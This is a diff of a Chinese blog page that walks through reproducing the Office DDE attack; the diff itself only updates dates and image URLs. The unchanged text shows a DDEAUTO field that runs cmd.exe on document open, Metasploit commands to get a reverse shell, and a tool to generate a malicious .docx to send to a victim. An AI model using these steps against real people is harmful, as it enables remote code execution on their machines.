@@ -245,7 +245,7 @@
 
     
         <meta property="article:published_time" content="Wed Mar 21 2018 12:50:36 GMT+0800">
-        <meta property="article:modified_time" content="Thu Apr 19 2018 19:52:19 GMT+0800">
+        <meta property="article:modified_time" content="Tue Jun 12 2018 16:08:59 GMT+0800">
     
 
     <!-- The Twitter Card protocol -->
@@ -268,7 +268,7 @@
     "mainEntityOfPage": "https://ares-x.com/2018/03/21/漏洞利用复现/index.html",
     "headline": "Office DDE 漏洞利用复现",
     "datePublished": "Wed Mar 21 2018 12:50:36 GMT+0800",
-    "dateModified": "Thu Apr 19 2018 19:52:19 GMT+0800",
+    "dateModified": "Tue Jun 12 2018 16:08:59 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "AresX",
@@ -535,12 +535,12 @@
 <p>在MSWord和MSExcel里，可以使用DDE来执行命令</p>
 <h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程:"></a>复现过程:</h1><p>新建一个Word文档，通过Ctrl+F9添加一个域，然后修改域代码为：</p>
 <pre><code>{ DDEAUTO “c:\\windows\\system32\\cmd.exe” &quot;/k calc.exe&quot; }
-</code></pre><p><img src="https://parrotsec-china.org/uploads/default/original/1X/11575048c39076f56719c8f6a4812899adfb2f8d.jpg" alt="image"></p>
+</code></pre><p><img src="https://parrotsec-cn.org/uploads/default/original/1X/11575048c39076f56719c8f6a4812899adfb2f8d.jpg" alt="image"></p>
 <p><code>DDEAUTO</code>关键字指示Word这是一个DDE域，并且在打开文档时自动执行域代码。在域代码中，紧跟<code>DDEAUTO</code>关键字后面的是要执行的可执行程序的路径，后面跟随的是可执行程序的参数</p>
 <p>保存文档之后双击打开</p>
-<p>[<img src="https://parrotsec-china.org/uploads/default/original/1X/f56307dea5de50cf2d7b8ddf1d99c4d3cda33bb6.png" alt="image"></p>
-<p>[<img src="https://parrotsec-china.org/uploads/default/original/1X/960d1785fa32aa4d951f3f89b9e93a4ddef57bb0.png" alt="image"></p>
-<p><img src="https://parrotsec-china.org/uploads/default/original/1X/7d07c7a2aa4dd7b9c3d9130b3ce15f5361d449a0.png" alt="image"></p>
+<p>[<img src="https://parrotsec-cn.org/uploads/default/original/1X/f56307dea5de50cf2d7b8ddf1d99c4d3cda33bb6.png" alt="image"></p>
+<p>[<img src="https://parrotsec-cn.org/uploads/default/original/1X/960d1785fa32aa4d951f3f89b9e93a4ddef57bb0.png" alt="image"></p>
+<p><img src="https://parrotsec-cn.org/uploads/default/original/1X/7d07c7a2aa4dd7b9c3d9130b3ce15f5361d449a0.png" alt="image"></p>
 <p>除了运行计算器之外还可以调用其他程序，配合PowerShell或者各类脚本程序的强大能力，可以下载或者释放恶意payload</p>
 <p>如使用msf配合生成恶意office文档</p>
 <p>Exp: <a href="https://www.exploit-db.com/exploits/43338/" target="_blank" rel="external">https://www.exploit-db.com/exploits/43338/</a></p>
@@ -704,15 +704,15 @@ end
 <pre><code>use exploit/poctest/43338
 set LHOST 192.168.40.133
 exploit
-</code></pre><p><img src="https://parrotsec-china.org/uploads/default/original/1X/dc6cd06662a3afd8698fdfeb056c9657d2a8ee81.jpg" alt="image"></p>
+</code></pre><p><img src="https://parrotsec-cn.org/uploads/default/original/1X/dc6cd06662a3afd8698fdfeb056c9657d2a8ee81.jpg" alt="image"></p>
 <p>在目标机器执行该文件，仍然全部选是</p>
-<p><img src="https://parrotsec-china.org/uploads/default/original/1X/127497dc8e52591b9345cbb5ee9ab9a1bb6ed469.jpg" alt="image"><br>收到shell</p>
+<p><img src="https://parrotsec-cn.org/uploads/default/original/1X/127497dc8e52591b9345cbb5ee9ab9a1bb6ed469.jpg" alt="image"><br>收到shell</p>
 <h1 id="利用工具2"><a href="#利用工具2" class="headerlink" title="利用工具2:"></a>利用工具2:</h1><pre><code>pip install  lxml
 
 git clone https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads.git
-</code></pre><p>执行<code>python ddeword.py</code><br>然后输入payload<br><img src="https://parrotsec-china.org/uploads/default/original/1X/3d64516d6b19a15ed1574f3b2eff857648692c43.jpg" alt="image"></p>
+</code></pre><p>执行<code>python ddeword.py</code><br>然后输入payload<br><img src="https://parrotsec-cn.org/uploads/default/original/1X/3d64516d6b19a15ed1574f3b2eff857648692c43.jpg" alt="image"></p>
 <p>在outlook文件夹下会生成具有恶意代码的doc文档</p>
-<p><img src="https://parrotsec-china.org/uploads/default/original/1X/6330b95065aff8e9c4e95d2a75197808c5cde583.png" alt="image"></p>
+<p><img src="https://parrotsec-cn.org/uploads/default/original/1X/6330b95065aff8e9c4e95d2a75197808c5cde583.png" alt="image"></p>
 <p>将payload-final.docx发送给受害者<br>受害者按打开后进行如之前一样的选择即可执行恶意代码</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>该攻击方法需要用户交互。但是，由于安全意识的缺乏，无论是企业里还是个人用户，依然有大量的用户中招。同时微软也表示，DDEAUTO技术并非漏洞而是正常的功能，因此并不打算修复该问题。因此可以推测，该方法会在很长时间里成为文档攻击的主流。</p>
 
